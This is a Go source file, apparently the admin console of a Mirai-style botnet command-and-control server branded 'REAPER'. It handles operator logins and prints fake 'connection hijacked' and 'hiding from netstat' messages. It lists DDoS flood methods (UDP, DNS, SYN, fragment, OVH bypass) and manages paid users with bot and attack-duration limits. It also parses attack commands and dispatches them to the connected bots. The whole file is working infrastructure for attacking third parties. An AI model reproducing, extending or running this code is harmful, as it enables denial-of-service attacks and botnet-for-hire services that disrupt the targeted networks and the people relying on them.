package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    headerb, err := ioutil.ReadFile("prompt.txt")
    if err != nil {
        return
    }

    header := string(headerb)
    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

    // Get username
    this.conn.Write([]byte(fmt.Sprintf("\033]0;[+] Reaper Sec | 8.8.8.8\007")))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;91m[\x1b[0;37mREAPER\x1b[38;5;91m] V1\r\n"))
    this.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.Write([]byte(fmt.Sprintf("\033]0;[+] Reaper Sec | 8.8.8.8\007")))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.Write([]byte(fmt.Sprintf("\033]0;[+] Reaper Sec | Validating Credentials.\007")))
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mChecking Account Info \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte(fmt.Sprintf("\033]0;[+] Reaper Sec | Your Connection Was Logged.\007")))
        this.conn.Write([]byte("\r\033[32;1mInvalid Login credentials\r\n"))
        this.conn.Write([]byte("\033[31mPress Any Key to continue\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte(fmt.Sprintf("\033]0;[+] Reaper Sec | Secureing Connections.\007")))
    this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
        this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i + 1)))
    }
    this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
    time.Sleep(1 * time.Second)

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Reapers Connected | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

        this.conn.Write([]byte("\033[2J\033[1H")) // clear screen
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\x1b[38;5;91m                      ╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗ \x1b[38;5;214m ╔═╗╔═╗╔═╗\r\n"))
        this.conn.Write([]byte("\x1b[38;5;92m                      ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝ \x1b[38;5;215m ╚═╗║╣ ║  \r\n"))
        this.conn.Write([]byte("\x1b[38;5;93m                      ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═ \x1b[38;5;216m ╚═╝╚═╝╚═╝\x1b[38;5;93mV1\x1b[38;5;213m.\x1b[38;5;93m0\r\n"))
        this.conn.Write([]byte("\x1b[38;5;214m                     Welcome [ "+ username +" ] To \x1b[38;5;93m[REAPER]\x1b[38;5;93m Botnet\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))


    this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
    for {

        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[38;5;37m[\x1b[38;5;91mREAPER\x1b[38;5;37m]# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }

        if err != nil || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "CLEAR" {
        this.conn.Write([]byte("\033[2J\033[1H")) // clear screen
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\x1b[38;5;91m                      ╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗ \x1b[38;5;214m ╔═╗╔═╗╔═╗\r\n"))
        this.conn.Write([]byte("\x1b[38;5;92m                      ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝ \x1b[38;5;215m ╚═╗║╣ ║  \r\n"))
        this.conn.Write([]byte("\x1b[38;5;93m                      ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═ \x1b[38;5;216m ╚═╝╚═╝╚═╝\x1b[38;5;93mV1\x1b[38;5;213m.\x1b[38;5;93m0\r\n"))
        this.conn.Write([]byte("\x1b[38;5;214m                     Welcome [ "+ username +" ] To \x1b[38;5;93m[REAPER]\x1b[38;5;93m Botnet\r\n"))
        this.conn.Write([]byte("\x1b[38;5;214m                        [\x1b[38;5;214mSEND\x1b[38;5;91m THEM\x1b[38;5;214m TO \x1b[38;5;91mTHE\x1b[38;5;214m AFTER \x1b[38;5;91mLIFE\x1b[38;5;214m]\r\n"))
        this.conn.Write([]byte("\r\n"))
            continue
        }



        botCount = userInfo.maxBots






// reseverd for commands

if err != nil || cmd == "HELP" || cmd == "help" {
this.conn.Write([]byte("\x1b[38;5;91m╔═════════════════════════════════╗\r\n"))
this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m ADMIN   | Shows Admin Commands \x1b[38;5;91m ║\r\n"))
this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m Methods | Shows the methods    \x1b[38;5;91m ║\r\n"))
this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m BOTS    | Shows Bot Count      \x1b[38;5;91m ║\r\n"))
this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m CLEAR   | Clears Screen        \x1b[38;5;91m ║\r\n"))
this.conn.Write([]byte("\x1b[38;5;91m╚═════════════════════════════════╝\r\n"))
    continue
}



if err != nil || cmd == "methods" || cmd == "METHODS" || cmd == "Methods" {
    this.conn.Write([]byte("       .:Reaper Methods:.\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m╔══════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.udpgame \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.dns     \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.syn     \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.frag    \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.hex     \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.stdhex  \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║\x1b[38;5;214m.ovh     \x1b[38;5;91m[\x1b[38;5;214mip\x1b[38;5;91m] [\x1b[38;5;214mtime\x1b[38;5;91m] dport=[\x1b[38;5;214mport\x1b[38;5;91m] ║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m╚══════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\r\n"))
    continue
}


if err != nil || cmd == "admin" || cmd == "ADMIN" {
    this.conn.Write([]byte("\x1b[38;5;91m╔═══════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║ \x1b[38;5;214madduser \x1b[38;5;91m|\x1b[38;5;214m Add a normal user   \x1b[38;5;91m║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║ \x1b[38;5;214maddadm  \x1b[38;5;91m|\x1b[38;5;214m Add a admin account \x1b[38;5;91m║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║ \x1b[38;5;214mremuser \x1b[38;5;91m|\x1b[38;5;214m remove a user       \x1b[38;5;91m║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m╚═══════════════════════════════╝\r\n"))

    continue
}



 if userInfo.admin == 1 && cmd == "addadm" {
            this.conn.Write([]byte("\033[0mAdmin User's Username:\033[1;31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mAdmin User's Password:\033[1;31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mAdmin User's Botcount\033[1;31m(\033[0m-1 for access to all\033[1;31m)\033[0m:\033[1;31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAdmin User's Attack Duration\033[1;31m(\033[0m-1 for none\033[1;31m)\033[0m:\033[1;31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mAdmin User's Cooldown\033[1;31m(\033[0m0 for none\033[1;31m)\033[0m:\033[1;31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New admin user's  info - \r\n- Username - \033[1;31m" + new_un + "\r\n\033[0m- Password - \033[1;31m" + new_pw + "\r\n\033[0m- Bots - \033[1;31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;31m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;31m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mAdmin User's  added successfully.\033[0m\r\n"))
            }
            continue
        }


        if userInfo.admin == 1 && cmd == "remuser" {
            this.conn.Write([]byte("\033[1;31mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[1;31mAre You Sure You Want To Remove \033[1;31m" + rm_un + "?\033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;97mUnable to remove users, sorry pal (`-`)\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }


        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "bots" || cmd == "BOTS" {
            this.conn.Write([]byte("\x1b[38;5;91m[REAPERS] \x1b[38;5;214m[CONNECTED]\r\n"))
            m := clientList.Distribution()
            for k, v := range m { 
                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))

            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
